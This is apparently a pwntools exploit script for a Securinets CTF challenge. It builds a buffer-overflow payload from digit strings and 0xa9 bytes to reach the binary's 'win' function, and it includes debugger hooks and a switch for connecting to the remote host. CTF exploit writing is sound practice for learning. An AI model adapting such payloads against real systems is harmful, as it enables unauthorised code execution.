#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 9000
HOST = "pwn-14caf623.p1.securinets.tn"
exe = context.binary = ELF('./main', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x000000000040130B
            b* 0x000000000040137F
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
win = exe.sym.win
log.info("Win: " + hex(win))

# PAYLOAD
payload = b''
for i in range(183):
	payload += f'{i}'.encode()
payload += f'{1}'.encode()
payload += f'{2}'.encode()

for i in range(0x11):
	payload += b'\xa9'

# GDB()
p.sendafter(b': ', payload)
p.sendafter(b': ', b'exit')

p.interactive()